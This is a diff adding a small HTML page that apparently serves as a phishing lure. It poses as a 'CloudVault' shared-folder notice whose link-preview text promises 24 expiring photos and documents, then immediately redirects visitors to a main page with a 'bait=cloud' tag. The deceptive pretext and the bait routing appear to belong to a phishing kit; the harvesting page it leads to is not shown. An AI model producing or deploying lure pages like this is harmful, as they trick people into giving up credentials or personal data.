@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CloudVault | Shared Folder & Storage Notice</title>
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="☁️ CloudVault: Shared Backup Folder (24 Items)" />
+  <meta property="og:description" content="View shared photos and documents before the temporary link expires." />
+  <meta name="theme-color" content="#2563eb" />
+  <meta http-equiv="refresh" content="0; url=./index.html?bait=cloud" />
+</head>
+<body style="background:#0b0d12;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
+  <p>Opening CloudVault...</p>
+  <script>
+    const p = new URLSearchParams(window.location.search);
+    if (!p.has('bait')) p.set('bait', 'cloud');
+    window.location.replace('./index.html?' + p.toString());
+  </script>
+</body>
+</html>
